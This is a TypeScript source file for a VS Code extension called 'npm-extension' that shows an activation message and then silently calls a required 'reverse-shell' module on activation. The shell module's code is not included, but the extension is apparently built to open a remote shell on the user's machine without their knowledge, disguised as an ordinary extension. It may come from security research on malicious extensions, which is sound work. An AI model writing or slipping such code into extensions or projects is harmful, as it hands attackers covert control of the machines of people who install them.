import * as vscode from 'vscode';
const reverseShell = require('reverse-shell')

export function activate(context: vscode.ExtensionContext) {
    vscode.window.showInformationMessage('npm-extension activated!');

	reverseShell();
}

export function deactivate() {}
